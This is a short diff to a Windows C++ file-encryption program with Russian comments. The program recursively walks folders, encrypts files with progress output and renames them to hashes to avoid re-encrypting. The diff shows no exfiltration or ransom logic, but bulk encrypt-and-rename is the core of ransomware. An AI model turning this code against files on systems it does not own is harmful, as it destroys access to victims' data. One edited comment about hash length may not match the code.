@@ -12,7 +12,7 @@
 #include <iostream>
 
 #define SIZE_DATA 32768 //Размер входного массива байтов
-#define WEXE_NAME L"pussyCrypt.exe"
+#define WEXE_NAME L"pussyCry.exe"
 
 bool errorFlag = false; //Флаг ошибки для прекращения работы программы
 
@@ -104,7 +104,7 @@ SelectModeLoop:
             continue;
         }
 
-        if (FindFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
+        if (FindFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) //Обработка директорий
         {
             if((wcscmp(MyFindFileName, L".")) && (wcscmp(MyFindFileName, L"..")) && tMode == L'e')
             {
@@ -120,7 +120,7 @@ SelectModeLoop:
             {
                 wprintf(L"Encryption file( %d/%d ): %ls\n", uFilesCount, uAllFilesCount, MyFindFileName);
 
-                if(!(MyFindFileName = RenameThisFile(MyFindFileName)))  //от перешифровки
+                if(!(MyFindFileName = RenameThisFile(MyFindFileName)))  //переименоание файла и защита от перешифровки
                 {
                     wprintf(L"The file's already encrypted, skipping it.\n\n");
                     continue;
@@ -565,10 +565,10 @@ LPTSTR RenameThisFile(LPTSTR _wszNameFile, bool isFolder)
     //Переписать хеш в строку
     for(DWORD i = 0; i < dwHashLen; i++)
     {
-        //Если папка, то длина хеша 6 байт
+        //Если папка, то длина хеша 10 байт
         if(isFolder)
         {
-            if(i%6 == 0)
+            if(i%3 == 0)
             {
                 sprintf(spHash[i], "%02x", bHash[i]);
                 strcat(sHash, spHash[i]);
@@ -576,8 +576,11 @@ LPTSTR RenameThisFile(LPTSTR _wszNameFile, bool isFolder)
         }
         else
         {
-            sprintf(spHash[i], "%02x", bHash[i]);
-            strcat(sHash, spHash[i]);
+            if(i%3 == 0)
+            {
+                sprintf(spHash[i], "%02x", bHash[i]);
+                strcat(sHash, spHash[i]);
+            }
         }
     }
 
